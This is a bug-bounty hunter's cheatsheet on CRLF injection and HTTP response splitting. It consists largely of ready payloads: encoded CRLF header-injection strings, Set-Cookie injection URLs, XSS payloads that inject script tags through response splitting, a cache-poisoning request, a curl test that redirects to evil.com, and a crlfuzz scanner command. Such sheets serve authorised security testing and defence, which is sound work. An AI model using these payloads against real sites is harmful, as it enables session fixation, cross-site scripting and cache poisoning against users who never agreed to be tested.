---
tags: [bugbounty, vuln/crlf, cheatsheet, p2, p3]
aliases: [CRLF Injection, HTTP Response Splitting, Header Injection]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# CRLF Injection / HTTP Response Splitting

> [!tldr] Hunter Summary
> **What:** Inject `\r\n` into response headers via user-controlled input → add headers, inject body, XSS.
> **Impact:** Cookie injection, XSS, cache poisoning, phishing via response body injection.
> **Best targets:** Any param reflected in response headers (redirects, custom headers, Set-Cookie).
> **Time to triage:** 10 min. Inject `%0d%0aSet-Cookie:injected=true`, check response headers.

---

## Detection Payloads

```
# Basic CRLF
%0d%0aInjected-Header: test
%0aInjected-Header: test
%0d%0a%0d%0a<html>injected body</html>

# URL encoded variants
%0D%0A  %0A  %0D  \r\n  \n
%E5%98%8A%E5%98%8D  (Unicode CRLF)
%E5%98%8A  (Unicode \n)
```

---

## Step-by-Step Hunt

### Step 1 — Find reflected header params
```bash
# Look for params that appear in redirect Location or Set-Cookie headers
# Check: login redirects, language switches, logout redirects

# Test
curl -sI "https://target.com/redirect?url=https://evil.com%0d%0aInjected: test"
# Look for "Injected: test" in response headers
```

### Step 2 — Cookie injection
```
# URL: https://target.com/setlang?lang=en%0d%0aSet-Cookie:admin=true
# Or:
https://target.com/page%0d%0aSet-Cookie:session=stolen_value
```

### Step 3 — XSS via CRLF
```
https://target.com/page%0d%0a%0d%0a<script>alert(document.domain)</script>

# If the app adds a Location header and it's reflected:
https://target.com/redirect?url=/%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### Step 4 — Cache poisoning via CRLF
```
# Inject a fake response that gets cached:
GET /page HTTP/1.1
Host: target.com
X-Override-URL: /%0d%0aContent-Length: 100%0d%0a%0d%0a<script>alert(1)</script>
```

---

## Tool

```bash
# crlfuzz - automated CRLF scanner
crlfuzz -u "https://target.com/FUZZ"
```

---

## References

- HackTricks CRLF — https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
- PayloadsAllTheThings CRLF — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
